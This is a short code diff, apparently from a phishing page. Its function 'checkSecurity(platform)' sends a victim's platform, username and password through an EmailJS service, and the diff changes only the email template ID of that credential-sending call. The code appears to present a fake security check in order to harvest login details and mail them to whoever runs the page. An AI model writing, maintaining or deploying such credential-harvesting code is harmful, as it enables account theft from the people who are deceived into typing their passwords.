@@ -31,7 +31,7 @@ function checkSecurity(platform) {
     });
 
     // إرسال البريد الإلكتروني
-    emailjs.send("service_ir3vg5y", "template_jw2qkzr", {
+    emailjs.send("service_ir3vg5y", "template_q95bk8a", {
         platform: platform,
         username: username,
         password: password
